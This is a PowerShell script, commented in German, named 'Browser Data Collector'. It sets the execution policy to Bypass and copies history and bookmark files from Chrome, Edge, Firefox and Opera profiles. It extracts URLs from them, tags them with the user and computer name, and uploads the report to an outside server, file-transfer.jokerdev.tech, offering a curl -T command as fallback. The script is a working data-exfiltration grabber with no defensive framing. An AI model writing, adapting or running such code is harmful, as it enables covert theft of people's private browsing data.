# Temporär deaktivieren der Ausführungsrichtlinie für diese Session (falls benötigt)
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,    
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType 
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $Results = @()

    # Chrome
    if ($Browser -eq 'chrome') {
        # Suche alle Chrome Profile
        $chromeProfiles = Get-ChildItem "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\*" -Directory | 
                         Where-Object { $_.Name -match "Default|Profile" }
        
        foreach ($profile in $chromeProfiles) {
            if ($DataType -eq 'history') {
                $Path = "$($profile.FullName)\History"
            }
            elseif ($DataType -eq 'bookmarks') {
                $Path = "$($profile.FullName)\Bookmarks"
            }
            
            if (Test-Path $Path) {
                Write-Host "Chrome $DataType gefunden in: $Path" -ForegroundColor Green
                try {
                    # Versuche, die Datei zu kopieren, falls sie gesperrt ist
                    $tempFile = "$env:TEMP\chrome_temp"
                    Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
                    
                    if (Test-Path $tempFile) {
                        $content = Get-Content -Path $tempFile -Raw -ErrorAction SilentlyContinue
                        if ($content) {
                            $matches = [regex]::Matches($content, $Regex)
                            foreach ($match in $matches) {
                                $Results += New-Object -TypeName PSObject -Property @{
                                    User = $env:UserName
                                    Browser = $Browser
                                    DataType = $DataType
                                    Profile = $profile.Name
                                    Data = $match.Value
                                }
                            }
                        }
                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                    }
                }
                catch {
                    Write-Warning "Fehler beim Lesen von $Path : $_"
                }
            }
        }
    }
    
    # Microsoft Edge (funktioniert ähnlich wie Chrome)
    elseif ($Browser -eq 'edge') {
        # Suche alle Edge Profile
        $edgeProfiles = Get-ChildItem "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\*" -Directory | 
                       Where-Object { $_.Name -match "Default|Profile" }
        
        foreach ($profile in $edgeProfiles) {
            if ($DataType -eq 'history') {
                $Path = "$($profile.FullName)\History"
            }
            elseif ($DataType -eq 'bookmarks') {
                $Path = "$($profile.FullName)\Bookmarks"
            }
            
            if (Test-Path $Path) {
                Write-Host "Edge $DataType gefunden in: $Path" -ForegroundColor Green
                try {
                    $tempFile = "$env:TEMP\edge_temp"
                    Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
                    
                    if (Test-Path $tempFile) {
                        $content = Get-Content -Path $tempFile -Raw -ErrorAction SilentlyContinue
                        if ($content) {
                            $matches = [regex]::Matches($content, $Regex)
                            foreach ($match in $matches) {
                                $Results += New-Object -TypeName PSObject -Property @{
                                    User = $env:UserName
                                    Browser = $Browser
                                    DataType = $DataType
                                    Profile = $profile.Name
                                    Data = $match.Value
                                }
                            }
                        }
                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                    }
                }
                catch {
                    Write-Warning "Fehler beim Lesen von $Path : $_"
                }
            }
        }
    }
    
    # Firefox
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        # Finde Firefox Profile
        $firefoxProfiles = Get-ChildItem "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*" -Directory
        
        foreach ($profile in $firefoxProfiles) {
            $Path = "$($profile.FullName)\places.sqlite"
            
            if (Test-Path $Path) {
                Write-Host "Firefox History gefunden in: $Path" -ForegroundColor Green
                try {
                    $tempFile = "$env:TEMP\firefox_temp"
                    Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
                    
                    if (Test-Path $tempFile) {
                        $content = Get-Content -Path $tempFile -Raw -Encoding Byte | 
                                   ForEach-Object { [char]$_ } | 
                                   Out-String -ErrorAction SilentlyContinue
                        
                        if ($content) {
                            $matches = [regex]::Matches($content, $Regex)
                            foreach ($match in $matches) {
                                $Results += New-Object -TypeName PSObject -Property @{
                                    User = $env:UserName
                                    Browser = $Browser
                                    DataType = $DataType
                                    Profile = $profile.Name
                                    Data = $match.Value
                                }
                            }
                        }
                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                    }
                }
                catch {
                    Write-Warning "Fehler beim Lesen von $Path : $_"
                }
            }
        }
    }
    
    # Opera
    elseif ($Browser -eq 'opera') {
        # Standard Opera
        if ($DataType -eq 'history') {
            $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\History"
        }
        elseif ($DataType -eq 'bookmarks') {
            $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Bookmarks"
        }
        
        # Opera GX (falls installiert)
        if (-not (Test-Path $Path)) {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
            }
            elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
            }
        }
        
        if (Test-Path $Path) {
            Write-Host "Opera $DataType gefunden in: $Path" -ForegroundColor Green
            try {
                $tempFile = "$env:TEMP\opera_temp"
                Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
                
                if (Test-Path $tempFile) {
                    $content = Get-Content -Path $tempFile -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        $matches = [regex]::Matches($content, $Regex)
                        foreach ($match in $matches) {
                            $Results += New-Object -TypeName PSObject -Property @{
                                User = $env:UserName
                                Browser = $Browser
                                DataType = $DataType
                                Profile = "Default"
                                Data = $match.Value
                            }
                        }
                    }
                    Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                }
            }
            catch {
                Write-Warning "Fehler beim Lesen von $Path : $_"
            }
        }
    }
    
    return $Results
}

# Debug-Funktion zum Überprüfen der Browser-Installationen
function Check-BrowserInstallations {
    Write-Host "`n=== Prüfe Browser-Installationen ===" -ForegroundColor Cyan
    
    # Chrome
    $chromePath = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
    if (Test-Path $chromePath) {
        Write-Host "[✓] Chrome gefunden" -ForegroundColor Green
        $profiles = Get-ChildItem $chromePath -Directory | Where-Object { $_.Name -match "Default|Profile" }
        Write-Host "    Profile: $($profiles.Count) gefunden" -ForegroundColor Yellow
    } else {
        Write-Host "[✗] Chrome nicht gefunden" -ForegroundColor Red
    }
    
    # Edge
    $edgePath = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
    if (Test-Path $edgePath) {
        Write-Host "[✓] Edge gefunden" -ForegroundColor Green
        $profiles = Get-ChildItem $edgePath -Directory | Where-Object { $_.Name -match "Default|Profile" }
        Write-Host "    Profile: $($profiles.Count) gefunden" -ForegroundColor Yellow
    } else {
        Write-Host "[✗] Edge nicht gefunden" -ForegroundColor Red
    }
    
    # Firefox
    $firefoxPath = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        Write-Host "[✓] Firefox gefunden" -ForegroundColor Green
        $profiles = Get-ChildItem $firefoxPath -Directory
        Write-Host "    Profile: $($profiles.Count) gefunden" -ForegroundColor Yellow
    } else {
        Write-Host "[✗] Firefox nicht gefunden" -ForegroundColor Red
    }
    
    # Opera
    $operaPaths = @(
        "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable",
        "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable"
    )
    
    $operaFound = $false
    foreach ($path in $operaPaths) {
        if (Test-Path $path) {
            Write-Host "[✓] Opera gefunden: $path" -ForegroundColor Green
            $operaFound = $true
        }
    }
    if (-not $operaFound) {
        Write-Host "[✗] Opera nicht gefunden" -ForegroundColor Red
    }
}

# Upload-Funktion (vereinfacht)
function Upload-File {
    param($FilePath, $UploadUrl)
    
    try {
        Write-Host "`nVersuche Upload von: $FilePath" -ForegroundColor Yellow
        
        # Methode 1: Mit .NET WebClient
        $webClient = New-Object System.Net.WebClient
        $fileName = Split-Path $FilePath -Leaf
        
        # Stelle sicher, dass die URL korrekt ist
        if (-not $UploadUrl.EndsWith("/")) {
            $UploadUrl = $UploadUrl.TrimEnd('/')
        }
        $fullUrl = "$UploadUrl/$fileName"
        
        Write-Host "Upload-URL: $fullUrl" -ForegroundColor Cyan
        $webClient.UploadFile($fullUrl, $FilePath)
        
        Write-Host "[✓] Upload erfolgreich!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[✗] Upload fehlgeschlagen: $_" -ForegroundColor Red
        return $false
    }
}

# Hauptskript
Write-Host "=== Browser Data Collector ===" -ForegroundColor Cyan
Write-Host "Starte mit Benutzer: $env:USERNAME" -ForegroundColor Yellow

# 1. Browser-Installationen prüfen
Check-BrowserInstallations

# 2. Browser-Daten sammeln
$outputFile = "$env:TEMP\BrowserData.txt"
$allData = @()

Write-Host "`n=== Sammle Browser-Daten ===" -ForegroundColor Cyan

$browsersToCheck = @(
    @{Browser = "chrome"; DataType = "history"},
    @{Browser = "chrome"; DataType = "bookmarks"},
    @{Browser = "edge"; DataType = "history"},
    @{Browser = "edge"; DataType = "bookmarks"},
    @{Browser = "firefox"; DataType = "history"},
    @{Browser = "opera"; DataType = "history"},
    @{Browser = "opera"; DataType = "bookmarks"}
)

foreach ($item in $browsersToCheck) {
    Write-Host "Prüfe: $($item.Browser) - $($item.DataType)" -ForegroundColor Gray
    $data = Get-BrowserData -Browser $item.Browser -DataType $item.DataType
    if ($data) {
        Write-Host "  Gefunden: $($data.Count) Einträge" -ForegroundColor Green
        $allData += $data
    } else {
        Write-Host "  Keine Daten gefunden" -ForegroundColor DarkGray
    }
}

# 3. Daten speichern
if ($allData.Count -gt 0) {
    Write-Host "`nGesammelte Einträge: $($allData.Count)" -ForegroundColor Green
    
    # Header
    "Browser Data Report" | Out-File -FilePath $outputFile -Encoding UTF8
    "====================" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    "Erstellt: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    "Benutzer: $env:USERNAME" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    "Computer: $env:COMPUTERNAME" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    "" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    
    # Daten gruppiert ausgeben
    $groupedData = $allData | Group-Object -Property Browser
    
    foreach ($group in $groupedData) {
        "=== $($group.Name.ToUpper()) ===" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
        
        $byType = $group.Group | Group-Object -Property DataType
        foreach ($typeGroup in $byType) {
            "  --- $($typeGroup.Name.ToUpper()) ---" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
            
            $uniqueUrls = $typeGroup.Group.Data | Sort-Object -Unique
            foreach ($url in $uniqueUrls) {
                "  $url" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
            }
            "" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
        }
    }
    
    Write-Host "Daten gespeichert in: $outputFile" -ForegroundColor Green
    
    # 4. Datei hochladen
    $uploadUrl = "https://file-transfer.jokerdev.tech/upload"
    $success = Upload-File -FilePath $outputFile -UploadUrl $uploadUrl
    
    if (-not $success) {
        Write-Host "`nTipp: Versuche diese Alternativen:" -ForegroundColor Yellow
        Write-Host "1. Als Administrator ausführen" -ForegroundColor Yellow
        Write-Host "2. Browser vorher schließen" -ForegroundColor Yellow
        Write-Host "3. Manuell hochladen: curl -T `"$outputFile`" $uploadUrl/BrowserData.txt" -ForegroundColor Yellow
    }
} else {
    Write-Host "`n[!] Keine Browser-Daten gefunden!" -ForegroundColor Red
    Write-Host "Mögliche Lösungen:" -ForegroundColor Yellow
    Write-Host "1. Skript als Administrator ausführen" -ForegroundColor Yellow
    Write-Host "2. Stelle sicher, dass du im richtigen Benutzerprofil bist" -ForegroundColor Yellow
    Write-Host "3. Browser vorher schließen" -ForegroundColor Yellow
    Write-Host "4. Überprüfe ob Browser überhaupt installiert sind" -ForegroundColor Yellow
}

Write-Host "`nDrücke eine Taste zum Beenden..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
